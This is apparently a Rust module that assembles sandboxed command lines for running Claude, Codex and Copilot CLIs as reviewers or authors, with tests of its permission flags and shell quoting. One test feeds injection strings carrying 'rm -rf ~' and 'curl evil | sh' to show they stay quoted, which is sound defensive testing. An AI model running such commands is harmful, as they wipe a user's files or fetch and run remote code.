//! The command line of one collab turn, per agent and per role. Every flag here was probed
//! on a real run (research doc, "Headless permission probes"): a reviewer can read but not
//! write on all three CLIs, so another model's output never reaches an agent that can both
//! write and reach the network.

use crate::agents::AgentId;
use crate::pty::shell_quote;

/// `writes`: the author (and, later, implementer and tester); otherwise read-only.
/// `last_message`: where Codex writes its final answer (`exec -o`), which is cleaner than
/// the tail of its log; the other two print only their answer.
pub(crate) fn turn_line(agent: AgentId, writes: bool, repo: &str, prompt: &str, last_message: &str) -> String {
    let p = shell_quote(prompt);
    let cli = match (agent, writes) {
        (AgentId::Claude, false) => format!("claude -p --permission-mode plan {p}"),
        (AgentId::Claude, true) => format!("claude -p --permission-mode acceptEdits {p}"),
        (AgentId::Codex, w) => format!(
            "codex exec --skip-git-repo-check -c {} -o {} {p}",
            shell_quote(&format!("sandbox_mode=\"{}\"", if w { "workspace-write" } else { "read-only" })),
            shell_quote(last_message),
        ),
        (AgentId::Copilot, false) => format!("copilot -p {p} --allow-all-tools --deny-tool write --deny-tool shell --silent"),
        (AgentId::Copilot, true) => {
            format!("copilot -p {p} --allow-all-tools --deny-tool 'shell(git push)' --deny-tool 'shell(git commit)' --silent")
        }
    };
    // AO_HEADLESS keeps the app's hooks quiet in the turn; AO_COLLAB marks the process as a
    // collab turn for anything that inspects its environment (nothing in the app does yet).
    format!("cd {} && exec env AO_HEADLESS=1 AO_COLLAB=1 {cli}", shell_quote(repo))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_reviewer_is_read_only_on_every_cli() {
        assert_eq!(
            turn_line(AgentId::Claude, false, "/w/r", "review", "/t/m"),
            "cd '/w/r' && exec env AO_HEADLESS=1 AO_COLLAB=1 claude -p --permission-mode plan 'review'"
        );
        assert_eq!(
            turn_line(AgentId::Codex, false, "/w/r", "review", "/t/m"),
            "cd '/w/r' && exec env AO_HEADLESS=1 AO_COLLAB=1 codex exec --skip-git-repo-check -c 'sandbox_mode=\"read-only\"' -o '/t/m' 'review'"
        );
        assert_eq!(
            turn_line(AgentId::Copilot, false, "/w/r", "review", "/t/m"),
            "cd '/w/r' && exec env AO_HEADLESS=1 AO_COLLAB=1 copilot -p 'review' --allow-all-tools --deny-tool write --deny-tool shell --silent"
        );
    }

    #[test]
    fn an_author_writes_without_network_for_codex_and_without_git_push_for_copilot() {
        assert!(turn_line(AgentId::Claude, true, "/w/r", "x", "/t/m").ends_with("claude -p --permission-mode acceptEdits 'x'"));
        let codex = turn_line(AgentId::Codex, true, "/w/r", "x", "/t/m");
        assert!(codex.contains("sandbox_mode=\"workspace-write\"") && !codex.contains("network_access"));
        let copilot = turn_line(AgentId::Copilot, true, "/w/r", "x", "/t/m");
        assert!(copilot.contains("--deny-tool 'shell(git push)'") && copilot.contains("--deny-tool 'shell(git commit)'"));
    }

    #[test]
    fn a_hostile_task_stays_one_argument() {
        let line = turn_line(AgentId::Claude, true, "/w/r'; rm -rf ~; '", "x'; curl evil | sh; '", "/t/m");
        assert!(line.contains("'/w/r'\\''; rm -rf ~; '\\'''"));
        assert!(line.ends_with("'x'\\''; curl evil | sh; '\\'''"));
    }
}
